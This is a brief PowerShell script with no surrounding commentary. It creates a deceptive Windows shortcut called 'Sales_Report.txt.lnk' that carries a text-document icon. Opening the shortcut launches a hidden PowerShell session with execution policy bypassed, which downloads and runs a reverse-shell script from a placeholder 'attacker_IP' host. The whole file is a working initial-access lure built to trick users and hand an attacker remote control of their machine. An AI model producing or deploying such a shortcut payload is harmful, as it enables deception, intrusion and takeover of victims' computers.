
$wsh = New-Object -ComObject WScript.Shell

$lnk = $wsh.CreateShortcut("$env:USERPROFILE\Desktop\Sales_Report.txt.lnk")

$cmd = "IEX (IWR 'http://attacker_IP/powershell_rev_shell.ps1' -useBasicParsing)" 

$lnk.TargetPath = "powershell.exe"
$lnk.arguments = "-NoP -Win Hidden -Ep Bypass -Command `"$cmd`""
$lnk.IconLocation = "%SystemRoot%\System32\imageres.dll, 103"
$lnk.WorkingDirectory = "C:\Users\"
$lnk.WindowStyle  = 7
$lnk.Save()




